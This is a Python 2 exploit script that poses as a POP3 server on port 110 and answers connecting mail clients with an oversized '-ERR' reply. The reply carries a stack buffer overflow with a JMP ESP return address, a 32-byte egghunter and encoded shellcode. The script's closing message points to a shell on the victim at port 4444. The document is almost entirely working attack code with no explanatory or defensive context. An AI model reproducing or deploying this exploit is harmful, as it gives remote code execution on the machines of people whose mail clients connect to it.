#!/usr/bin/python 

import sys, socket

#7E429353   FFE4             JMP ESP
#[+] Egghunter  (32 bytes):
#"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
#"\xef\xb8\x52\x4f\x4f\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#[+] Egg set to ROOT
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x4f\x4f\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buf =  b""
buf += b"\xda\xc4\xbd\x1a\x2f\x1b\x8a\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x53\x31\x6a\x17\x03\x6a\x17\x83\xd8\x2b\xf9"
buf += b"\x7f\x20\xdb\x7f\x7f\xd8\x1c\xe0\x09\x3d\x2d\x20\x6d"
buf += b"\x36\x1e\x90\xe5\x1a\x93\x5b\xab\x8e\x20\x29\x64\xa1"
buf += b"\x81\x84\x52\x8c\x12\xb4\xa7\x8f\x90\xc7\xfb\x6f\xa8"
buf += b"\x07\x0e\x6e\xed\x7a\xe3\x22\xa6\xf1\x56\xd2\xc3\x4c"
buf += b"\x6b\x59\x9f\x41\xeb\xbe\x68\x63\xda\x11\xe2\x3a\xfc"
buf += b"\x90\x27\x37\xb5\x8a\x24\x72\x0f\x21\x9e\x08\x8e\xe3"
buf += b"\xee\xf1\x3d\xca\xde\x03\x3f\x0b\xd8\xfb\x4a\x65\x1a"
buf += b"\x81\x4c\xb2\x60\x5d\xd8\x20\xc2\x16\x7a\x8c\xf2\xfb"
buf += b"\x1d\x47\xf8\xb0\x6a\x0f\x1d\x46\xbe\x24\x19\xc3\x41"
buf += b"\xea\xab\x97\x65\x2e\xf7\x4c\x07\x77\x5d\x22\x38\x67"
buf += b"\x3e\x9b\x9c\xec\xd3\xc8\xac\xaf\xbb\x3d\x9d\x4f\x3c"
buf += b"\x2a\x96\x3c\x0e\xf5\x0c\xaa\x22\x7e\x8b\x2d\x44\x55"
buf += b"\x6b\xa1\xbb\x56\x8c\xe8\x7f\x02\xdc\x82\x56\x2b\xb7"
buf += b"\x52\x56\xfe\x22\x5a\xf1\x51\x51\xa7\x41\x02\xd5\x07"
buf += b"\x2a\x48\xda\x78\x4a\x73\x30\x11\xe3\x8e\xbb\x0c\xa8"
buf += b"\x07\x5d\x44\x40\x4e\xf5\xf0\xa2\xb5\xce\x67\xdc\x9f"
buf += b"\x66\x0f\x95\xc9\xb1\x30\x26\xdc\x95\xa6\xad\x33\x22"
buf += b"\xd7\xb1\x19\x02\x80\x26\xd7\xc3\xe3\xd7\xe8\xc9\x93"
buf += b"\x74\x7a\x96\x63\xf2\x67\x01\x34\x53\x59\x58\xd0\x49"
buf += b"\xc0\xf2\xc6\x93\x94\x3d\x42\x48\x65\xc3\x4b\x1d\xd1"
buf += b"\xe7\x5b\xdb\xda\xa3\x0f\xb3\x8c\x7d\xf9\x75\x67\xcc"
buf += b"\x53\x2c\xd4\x86\x33\xa9\x16\x19\x45\xb6\x72\xef\xa9"
buf += b"\x07\x2b\xb6\xd6\xa8\xbb\x3e\xaf\xd4\x5b\xc0\x7a\x5d"
buf += b"\x6b\x8b\x26\xf4\xe4\x52\xb3\x44\x69\x65\x6e\x8a\x94"
buf += b"\xe6\x9a\x73\x63\xf6\xef\x76\x2f\xb0\x1c\x0b\x20\x55"
buf += b"\x22\xb8\x41\x7c"

host = '192.168.0.19'
port = 110

buffer = ''
buffer += 'A' * 712
buffer += '\x53\x93\x42\x7E'
buffer += egghunter
#buffer += 'C' * 1000
buffer += 'ROOTROOT'
buffer += buf
sploit = "-ERR" + buffer


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print('[*] Listening on port 110.')
    conn, addr = s.accept()
    print '[*] Received connection from: ', addr

    while 1:
        conn.send(sploit)
    conn.close()
except:
    print('[*] Done, Wait a bit for the egghunter then connect to the victim on port 4444')
